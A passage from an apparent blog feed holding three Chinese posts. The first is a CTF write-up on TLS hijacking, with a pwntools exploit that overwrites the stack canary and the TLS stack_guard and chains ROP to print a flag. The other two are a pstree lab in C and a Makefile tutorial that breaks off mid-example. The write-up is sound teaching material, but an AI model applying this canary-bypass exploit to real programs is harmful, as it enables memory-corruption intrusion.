data，TSD）。</li></ol><p><strong>在Linux中，进程和线程都是轻量级的执行单元，它们有以下区别和联系</strong></p><p>区别：</p><ol><li>资源占用：进程是系统分配资源的基本单位，每个进程拥有独立的地址空间、文件描述符、信号处理器等系统资源，而线程共享同一个进程的资源。</li><li>调度：进程之间的切换代价比线程之间的切换代价要高，因为进程切换时需要保存和恢复更多的状态信息，而线程只需要保存和恢复少量的状态信息。</li><li>安全：不同进程之间的内存空间是相互隔离的，因此进程之间的访问不会相互干扰，而线程之间的访问则需要进行同步控制，以避免竞态条件等问题。</li></ol><p>联系：</p><ol><li>资源共享：进程内的所有线程共享同一个地址空间，因此它们可以共享全局变量、静态变量、代码段和数据段等内存区域。</li><li>处理器调度：线程是处理器调度的基本单位，一个进程中的多个线程可以并发执行，以提高处理器的利用率。</li><li>通信机制：进程之间通信可以使用IPC机制，而线程之间可以使用线程同步和互斥机制等方式进行通信和协调。</li></ol><h2 id="Thread-Local-Storage"><a href="#Thread-Local-Storage" class="headerlink" title="Thread Local Storage"></a>Thread Local Storage</h2><p><a href="https://gcc.gnu.org/onlinedocs/gcc/Thread-Local.html">https://gcc.gnu.org/onlinedocs/gcc/Thread-Local.html</a></p><p>线程局部存储（TLS），是一种变量的存储方法，每一个线程都会有一个副本，这个变量在它所在的线程内是全局可访问的，但是不能被其他线程访问到，这样就保持了数据的线程独立性。而熟知的全局变量，是所有线程都可以访问的，这样就不可避免需要锁来控制，增加了控制成本和代码复杂度。</p><p>gcc里再定义前加__thread就可以实现TLS</p><p>创建线程的时候会创建一个TLS（Thread Local Storage），该TLS会存储canary的值，而TLS会保存在stack高地址的地方</p><p><strong>主线程中的TLS通常位于mmap映射出来的地址空间里，而位置也比较随机，覆盖的可能性不大；子线程通常也是mmap出来的，子线程中的TLS则位于线程栈的顶部</strong></p><p><strong>tcbhead_t结构体</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">        <span class="type">void</span> *tcb;        <span class="comment">/* Pointer to the TCB.  Not necessarily the</span></span><br><span class="line"><span class="comment">                             thread descriptor used by libpthread.  */</span></span><br><span class="line">        <span class="type">dtv_t</span> *dtv;</span><br><span class="line">        <span class="type">void</span> *self;        <span class="comment">/* Pointer to the thread descriptor.  */</span></span><br><span class="line">        <span class="type">int</span> multiple_threads;</span><br><span class="line">        <span class="type">int</span> gscope_flag;</span><br><span class="line">        <span class="type">uintptr_t</span> sysinfo;</span><br><span class="line">        <span class="type">uintptr_t</span> stack_guard;   <span class="comment">/* canary，0x28偏移 */</span></span><br><span class="line">        <span class="type">uintptr_t</span> pointer_guard;</span><br><span class="line">        ……</span><br><span class="line">&#125; <span class="type">tcbhead_t</span>;</span><br></pre></td></tr></table></figure><h3 id="gdb多线程调试"><a href="#gdb多线程调试" class="headerlink" title="gdb多线程调试"></a>gdb多线程调试</h3><p>set follow-fork-mode child</p><p>show follow-fork-mode </p><p>(1)查看可切换调试的线程：info threads</p><p>(2)切换调试的线程：thread 线程id</p><p>(3)只运行当前线程：set scheduler-locking on</p><p>(4)运行全部的线程：set scheduler-locking off</p><p>(5)指定某线程执行某gdb命令：thread apply 线程id gdb_cmd</p><p>(6)全部的线程执行某gdb命令：thread apply all gdb_cmd</p><p><strong>x&#x2F;x pthread_self()或fsbase</strong>可以查看线程fs基位置</p><p>断点断到子线程函数</p><p><img src="/2023/03/26/TLS-Hijack/image-20230326174219767.png" alt="image-20230326174219767"></p><p>distance计算偏移，覆盖canary和stack_guard为用一个值即可,rop puts输出flag即可</p><p><img src="/2023/03/26/TLS-Hijack/image-20230326174414780.png" alt="image-20230326174414780"></p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./checkin&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,x)</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:success(x+<span class="string">&#x27;--&gt;&#x27;</span>+<span class="built_in">hex</span>(y))</span><br><span class="line"><span class="comment"># db(&#x27;b *0x401338&#x27;)</span></span><br><span class="line"><span class="comment"># db(&#x27;b *0x401340&#x27;)</span></span><br><span class="line"><span class="comment"># db(&#x27;b *0x401341 &#x27;)</span></span><br><span class="line"></span><br><span class="line">padding=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>+p64(<span class="number">0x666666</span>)+p64(<span class="number">0x555555</span>)+p64(rop.rdi.address)+p64(<span class="number">0x4040C0</span>)+p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>])+<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x7d8</span>-<span class="number">0x20</span>)+p64(<span class="number">0x666666</span>)</span><br><span class="line">payload=padding</span><br><span class="line">sla(<span class="string">b&#x27;eckin\n&#x27;</span>,payload)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Tls Hijack </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NJUOS:M1 pstree</title>
      <link href="/2023/03/25/NJUOS-M1-pstree/"/>
      <url>/2023/03/25/NJUOS-M1-pstree/</url>
      
        <content type="html"><![CDATA[<p><a href="http://jyywiki.cn/OS/2022/labs/M1">http://jyywiki.cn/OS/2022/labs/M1</a></p><p><strong>Keep it simple, stupid &amp;&amp; Everything is a file.</strong></p><p>可以用strace看一下pstree的系统调用，找下思路</p><h3 id="找到进程关系"><a href="#找到进程关系" class="headerlink" title="找到进程关系"></a>找到进程关系</h3><p>proc 文件系统 (procfs) 是类 Unix 操作系统中的一种特殊文件系统，它以分层文件结构呈现有关进程的信息和其他系统信息，为动态访问内核中保存的进程数据提供了一种更方便和标准化的方法。 </p><p>dirent.h头文件里有读取文件夹的func <a href="https://man7.org/linux/man-pages/man0/dirent.h.0p.html">https://man7.org/linux/man-pages/man0/dirent.h.0p.html</a></p><p>目录操作函数opendir、readdir和closedir</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;dirent.h&gt;</span></span></span><br><span class="line">DIR *<span class="title function_">opendir</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *name)</span>;</span><br><span class="line">打开一个与给定的目录名name相对应的目录流，并返回一个指向该目录流的指针。打开后，该目录流指向了目录中的第一个目录项。</span><br><span class="line"><span class="keyword">struct</span> dirent *<span class="title function_">readdir</span><span class="params">(DIR *dir)</span>;</span><br><span class="line">readdir函数返回一个指向dirent结构体的指针，该结构体代表了由dir指向的目录流中的下一个目录项；如果读到end-of-file或者出现了错误，那么返回<span class="literal">NULL</span>。</span><br><span class="line"><span class="type">int</span> <span class="title function_">closedir</span><span class="params">(DIR *dir)</span>;</span><br><span class="line">closedir函数关闭与指针dir相联系的目录流。成功时返回<span class="number">0</span>；失败是返回<span class="number">-1</span>，并设置相应的错误代码errno。</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">dirent</span> &#123;</span></span><br><span class="line">        <span class="type">ino_t</span>          d_ino;       <span class="comment">/* inode number */</span></span><br><span class="line">        <span class="type">off_t</span>          d_off;       <span class="comment">/* offset to the next dirent */</span></span><br><span class="line">        <span class="type">unsigned</span> <span class="type">short</span> d_reclen;    <span class="comment">/* length of this record */</span></span><br><span class="line">        <span class="type">unsigned</span> <span class="type">char</span>  d_type;      <span class="comment">/* type of file */</span></span><br><span class="line">        <span class="type">char</span>           d_name[<span class="number">256</span>]; <span class="comment">/* filename */</span></span><br><span class="line">    &#125;;</span><br></pre></td></tr></table></figure><p>&#x2F;proc&#x2F;PID&#x2F;stat：在 Linux 操作系统中，&#x2F;proc&#x2F;PID&#x2F;stat 文件提供了有关指定进程 PID 的进程状态信息。该文件的格式是一个文本文件，其中包含了进程的多个状态信息，这些信息通常以空格分隔。</p><p>&#x2F;proc&#x2F;PID&#x2F;status是可读性更好的stat</p><p>&#x2F;proc&#x2F;PID&#x2F;task：该目录包含了与指定进程 PID 关联的所有线程的信息，每个线程都有一个相应的子目录。这些子目录的名称为每个线程的线程 ID，其下包含了与该线程相关的信息，包括线程状态、线程所属的进程 ID、线程运行的 CPU 时间、线程栈的大小和内存地址等。此目录可以用于监视和管理进程中的多个线程。</p><p>这里我们只需要遍历&#x2F;proc&#x2F;PID&#x2F;stat拿到ppid就行</p><p> &#x2F;proc&#x2F;PID&#x2F;stat 文件的一般格式和其中包含的常见进程属性</p><ul><li>pid：进程 ID</li><li>comm：进程的命令名称</li><li>state：进程状态</li><li>ppid：父进程 ID</li><li>pgrp：进程组 ID</li><li>session：会话 ID</li><li>tty_nr：所使用的终端设备号</li><li>tpgid：进程组 ID</li><li>flags：进程标志</li><li>minflt：未分配页面的数量（内存不足）</li><li>cminflt：未分配文件缓存页面的数量</li><li>majflt：分配了的页面的数量</li><li>cmajflt：分配了的文件缓存页面的数量</li><li>utime：进程在用户模式下花费的时间（以时钟滴答为单位）</li><li>stime：进程在内核模式下花费的时间（以时钟滴答为单位）</li><li>cutime：子进程在用户模式下花费的时间</li></ul><h3 id="建树打印"><a href="#建树打印" class="headerlink" title="建树打印"></a>建树打印</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">processtree</span> &#123;</span></span><br><span class="line">    <span class="type">pid_t</span> pid;</span><br><span class="line">    <span class="type">char</span> pidname[<span class="number">36</span>];</span><br><span class="line">&#125; Processtree;</span><br></pre></td></tr></table></figure><p>所有进程都是进程1的子进程，我们把1进程作为root，边递归边打印树就可以</p><h3 id="code"><a href="#code" class="headerlink" title="code"></a>code</h3><blockquote><p>#include &lt;assert.h&gt;</p><p>assert(exp)可以帮助我们快速定位错误，exp为假（即为0），那么它先向stderr打印一条出错信息，然后通过调用 abort 来终止程序运行。</p><p>调试结束后可以在#include &lt;assert.h&gt;上方#define NDEBUG来禁用assert调用</p></blockquote><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;dirent.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;getopt.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">pipinfo</span> &#123;</span></span><br><span class="line">    <span class="type">char</span> pidname[<span class="number">36</span>];</span><br><span class="line">    <span class="type">pid_t</span> pid;</span><br><span class="line">    <span class="type">pid_t</span> ppid;</span><br><span class="line">&#125; Pipinfo;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">processtree</span> &#123;</span></span><br><span class="line">    <span class="type">pid_t</span> pid;</span><br><span class="line">    <span class="type">char</span> pidname[<span class="number">36</span>];</span><br><span class="line">&#125; Processtree;</span><br><span class="line"></span><br><span class="line">Pipinfo allpid[<span class="number">666</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="type">int</span> pidcount = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">setProcessInfo</span><span class="params">()</span>;</span><br><span class="line"><span class="type">pid_t</span> <span class="title function_">getPpid</span><span class="params">(<span class="type">char</span>*, <span class="type">char</span>*)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">creatTree</span><span class="params">(<span class="type">bool</span> pid, Processtree* root, <span class="type">int</span> paddinglen)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">findAllchild</span><span class="params">(<span class="type">pid_t</span> pid, <span class="type">int</span>* childrenar)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span> &#123;</span><br><span class="line">    setProcessInfo();</span><br><span class="line">    Processtree* root = (Processtree*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Processtree));</span><br><span class="line">    root-&gt;pid = allpid[<span class="number">0</span>].pid;</span><br><span class="line">    <span class="built_in">strcpy</span>(root-&gt;pidname, allpid[<span class="number">0</span>].pidname);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> opt;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">option</span> <span class="title">longopt</span>[] =</span> &#123;</span><br><span class="line">        &#123;<span class="string">&quot;show-pids&quot;</span>,<span class="number">0</span>,<span class="literal">NULL</span>,<span class="string">&#x27;p&#x27;</span>&#125;,</span><br><span class="line">        &#123;<span class="string">&quot;numeric-sort&quot;</span>,<span class="number">0</span>,<span class="literal">NULL</span>,<span class="string">&#x27;n&#x27;</span>&#125;,</span><br><span class="line">        &#123;<span class="string">&quot;version&quot;</span>,<span class="number">0</span>,<span class="literal">NULL</span>,<span class="string">&#x27;V&#x27;</span>&#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">switch</span> (opt = getopt_long(argc, argv, <span class="string">&quot;Vpnh&quot;</span>, longopt, <span class="literal">NULL</span>)) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;V&#x27;</span>:</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Grxer 2023 3 25\n&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;p&#x27;</span>:</span><br><span class="line">        creatTree(<span class="literal">true</span>, root, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;n&#x27;</span>:</span><br><span class="line">        creatTree(<span class="literal">false</span>, root, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (optind == argc) &#123;</span><br><span class="line">        creatTree(<span class="literal">false</span>, root, <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;pstree -h for help&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">setProcessInfo</span><span class="params">()</span> &#123;</span><br><span class="line">    DIR* proc = opendir(<span class="string">&quot;/proc&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!proc) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;%s&quot;</span>, <span class="string">&quot;Can &#x27;t open /proc/&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">int</span> pid = <span class="number">0</span>;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">dirent</span>* <span class="title">entry</span>;</span></span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">NULL</span> != (entry = readdir(proc))) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="number">0</span> == (pid = atoi(entry-&gt;d_name)))</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            <span class="comment">// printf(&quot;%d\n&quot;, pid);</span></span><br><span class="line">            allpid[pidcount].pid = pid;</span><br><span class="line">            allpid[pidcount].ppid = getPpid(entry-&gt;d_name, allpid[pidcount].pidname);</span><br><span class="line">            <span class="comment">// printf(&quot;%d:%s:%d\n&quot;, allpid[pidcount].pid, allpid[pidcount].pidname, allpid[pidcount].ppid);</span></span><br><span class="line">            pidcount++;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    closedir(proc);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//拿到父进程</span></span><br><span class="line"><span class="type">pid_t</span> <span class="title function_">getPpid</span><span class="params">(<span class="type">char</span>* pid, <span class="type">char</span>* name)</span> &#123;</span><br><span class="line">    <span class="type">char</span> processpath[<span class="number">30</span>] = <span class="string">&quot;/proc/&quot;</span>;</span><br><span class="line">    <span class="built_in">strcat</span>(processpath, pid);</span><br><span class="line">    <span class="built_in">strcat</span>(processpath, <span class="string">&quot;/stat&quot;</span>);</span><br><span class="line">    <span class="comment">// printf(&quot;%s\n&quot;, processpath);</span></span><br><span class="line">    FILE* fp = fopen(processpath, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (fp) &#123;</span><br><span class="line">        <span class="type">char</span> i;</span><br><span class="line">        <span class="type">pid_t</span> _pid, ppid;</span><br><span class="line">        <span class="built_in">fscanf</span>(fp, <span class="string">&quot;%d (%s %c %d&quot;</span>, &amp;_pid, name, &amp;i, &amp;ppid);</span><br><span class="line">        name[<span class="built_in">strlen</span>(name) - <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">        <span class="comment">// printf(&quot;%d:%s:%d\n&quot;, _pid, name, ppid);</span></span><br><span class="line">        fclose(fp);</span><br><span class="line">        <span class="keyword">return</span> ppid;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;%s %s %s&quot;</span>, <span class="string">&quot;open&quot;</span>, processpath, <span class="string">&quot;fail&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">creatTree</span><span class="params">(<span class="type">bool</span> pidflag, Processtree* root, <span class="type">int</span> paddinglen)</span> &#123;</span><br><span class="line">    <span class="type">int</span> childrens[<span class="number">666</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    findAllchild(root-&gt;pid, childrens);</span><br><span class="line">    <span class="type">char</span> str[<span class="number">60</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="keyword">if</span> (childrens[<span class="number">0</span>] == <span class="number">0</span>) &#123;<span class="comment">//没有子进程直接打印返回</span></span><br><span class="line">        <span class="keyword">if</span> (pidflag)</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%s(%d)&quot;</span>, root-&gt;pidname, root-&gt;pid);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, root-&gt;pidname);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (pidflag)</span><br><span class="line">        <span class="built_in">sprintf</span>(str, <span class="string">&quot;%s(%d)-+-&quot;</span>, root-&gt;pidname, root-&gt;pid);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">sprintf</span>(str, <span class="string">&quot;%s-+-&quot;</span>, root-&gt;pidname);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, str);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">666</span> &amp;&amp; <span class="number">0</span> != childrens[i]; i++) &#123;</span><br><span class="line">        Processtree* temp = (Processtree*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Processtree));</span><br><span class="line">        <span class="keyword">if</span> (temp == <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;malloc failed&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        temp-&gt;pid = allpid[childrens[i]].pid;</span><br><span class="line">        <span class="built_in">strcpy</span>(temp-&gt;pidname, allpid[childrens[i]].pidname);</span><br><span class="line">        creatTree(pidflag, temp, <span class="built_in">strlen</span>(str) + paddinglen);<span class="comment">//递归打印</span></span><br><span class="line">        <span class="keyword">if</span> (i + <span class="number">1</span> &lt; <span class="number">500</span> &amp;&amp; childrens[i + <span class="number">1</span>] != <span class="number">0</span>)<span class="comment">//下一个子进程还不为空，对齐，打印树枝</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(str) + paddinglen; i++) &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot; &quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;|-&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">free</span>(root);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//找到全部子线程 csapp 5.8 循环展开优化</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">findAllchild</span><span class="params">(<span class="type">pid_t</span> pid, <span class="type">int</span>* childrenar)</span> &#123;</span><br><span class="line">    <span class="type">size_t</span> index = <span class="number">0</span>;</span><br><span class="line">    <span class="type">size_t</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (;i &lt; pidcount - <span class="number">1</span>; i += <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (allpid[i].ppid == pid)</span><br><span class="line">            childrenar[index++] = i;</span><br><span class="line">        <span class="keyword">if</span> (allpid[i + <span class="number">1</span>].ppid == pid)</span><br><span class="line">            childrenar[index++] = i + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (; i &lt; pidcount; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (allpid[i].ppid == pid)</span><br><span class="line">            childrenar[index++] = i;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> NJUOS Lab </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>How 2 GNU Makefile</title>
      <link href="/2023/03/25/How2Makefile/"/>
      <url>/2023/03/25/How2Makefile/</url>
      
        <content type="html"><![CDATA[<h2 id="Makefile-advantage"><a href="#Makefile-advantage" class="headerlink" title="Makefile advantage"></a>Makefile advantage</h2><ol><li>管理代码的编译，决定该编译什么文件，编译顺序，以及是否需要重新编译；</li><li>节省编译时间。如果文件有更改，只需重新编译此文件即可，无需重新编译整个工程；</li><li>一劳永逸。Makefile通常只需编写一次，后期就不用过多更改。</li></ol><h2 id="命名规则"><a href="#命名规则" class="headerlink" title="命名规则"></a>命名规则</h2><p><strong>Makefile</strong>或<strong>makefile</strong></p><p>其他名字需要 make -f filename</p><h2 id="基本规则"><a href="#基本规则" class="headerlink" title="基本规则"></a>基本规则</h2><figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line">&lt;target&gt; : &lt;prerequisites&gt; </span><br><span class="line">[tab]  &lt;commands&gt;</span><br></pre></td></tr></table></figure><ul><li><p>只有当target不存在，或这prerequisites里的文件比target新是才会执行commands</p></li><li><p>多个目标文件用空格隔开，可以用\来换行</p></li><li><p>注释 #单行</p></li><li><p>make 没有指定文件时，默认会执行Makefile文件的第一个目标</p></li><li><p>.PHONY 多个可以用空格分开</p><blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">.PHONY: clean</span><br><span class="line">clean:</span><br><span class="line">        <span class="built_in">rm</span> *.o temp</span><br><span class="line"><span class="comment"># make clean</span></span><br></pre></td></tr></table></figure><p>声明clean是”伪目标”之后，make就不会去检查是否存在一个叫做clean的文件，而是每次运行都执行对应的命令，解决当前文件夹下有个clean的冲突</p></blockquote></li><li><p>伪目标，即没有commands</p><blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">source</span>: file1 file2 file3</span><br></pre></td></tr></table></figure><p>make source相当于</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ make file1</span><br><span class="line">$ make file2</span><br><span class="line">$ make file3</span><br></pre></td></tr></table></figure></blockquote></li><li><p>@可以关闭commands的回显</p></li><li><p>%模式匹配，匹配文件夹下每一个符合文件</p><blockquote><p>模式规则是在目标及依赖条件中使用%来匹配对应的文件，比如在目录下有main.c, func1.c, func2.c三个文件，对这三个文件的编译可以由一条规则完成：</p><p><code>%.o:%.c  $(CC) –c $&lt; -o $@</code></p></blockquote></li><li><p><strong>-</strong> ：表示此命令即使执行出错，也依然继续执行后续命令</p></li><li><p>include<filename> 引用其它的Makefile</filename></p></li></ul><h2 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h2><p>类似于c语言的macro</p><p>用&#x3D;号赋值</p><p>用$()取值</p><figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line">VARIABLE = value</span><br><span class="line"><span class="comment"># 在执行时扩展，允许递归扩展。</span></span><br><span class="line"></span><br><span class="line">VARIABLE := value</span><br><span class="line"><span class="comment"># 在定义时扩展。恒等于</span></span><br><span class="line"></span><br><span class="line">VARIABLE ?= value</span><br><span class="line"><span class="comment"># 只有在该变量为空时才设置值。</span></span><br><span class="line"></span><br><span class="line">VARIABLE += value</span><br><span class="line"><span class="comment"># 将值追加到变量的尾端。</span></span><br></pre></td></tr></table></figure><h2 id="自动变量"><a href="#自动变量" class="headerlink" title="自动变量"></a>自动变量</h2><figure class="highlight tex"><table><tr><td class="code"><pre><span class="line"><span class="built_in">$</span>@    规则中的目标</span><br><span class="line"></span><br><span class="line"><span class="built_in">$</span>&lt;     规则中的第一个依赖条件</span><br><span class="line"></span><br><span class="line"><span class="built_in">$</span><span class="built_in">^</span>    规则中的所有依赖条件</span><br><span class="line">app: main.c func1.c fun2.c</span><br><span class="line">    gcc <span class="built_in">$</span><span class="built_in">^</span> - o <span class="built_in">$</span>@</span><br><span class="line">其中：<span class="built_in">$</span><span class="built_in">^</span>表示main.c func1.c fun2.c，<span class="built_in">$</span>&lt;表示main.c，<span class="built_in">$</span>@表示app。</span><br><span class="line"></span><br><span class="line"><span class="built_in">$</span>* 　　不包含扩展名的目标文件名称。</span><br><span class="line"></span><br><span class="line"><span class="built_in">$</span>+ 　　所有的依赖文件，以空格分开，并以出现的先后为序，可能包含重复的依赖文件。</span><br><span class="line"></span><br><span class="line"><span class="built_in">$</span>? 　　所有的依赖文件，以空格分开，这些依赖文件的修改日期比目标的创建日期晚。</span><br><span class="line"></span><br><span class="line"><span class="built_in">$</span>@ 　 目标的完整名称。</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><p><strong>wildcard:</strong></p><p>用于查找指定目录下指定类型的文件，参数就是目录+文件类型，比如：</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">src = $（wildcard ./src/*.c)</span><br></pre></td></tr></table></figure><p>这句话表示：找到.&#x2F;src 目录下所有后缀为.c的文件，并赋给变量src。</p><p><strong>patsubst:</strong></p><p>匹配替换，例如以下例子，用于从src目录中找到所有.c 结尾的文件，并将其替换为.o文件，并赋值给obj。</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">obj = $(patsubst %.c ,%.o ,$(src))</span><br></pre></td></tr></table></figure><p>把src变量中所有后缀为.c的文件替换成.o。</p><p>特别地，如果要把所有.o文件放在obj目录下，可用以下方法：</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">ob = $(patsubst ./src/%.c, ./obj/%.o, 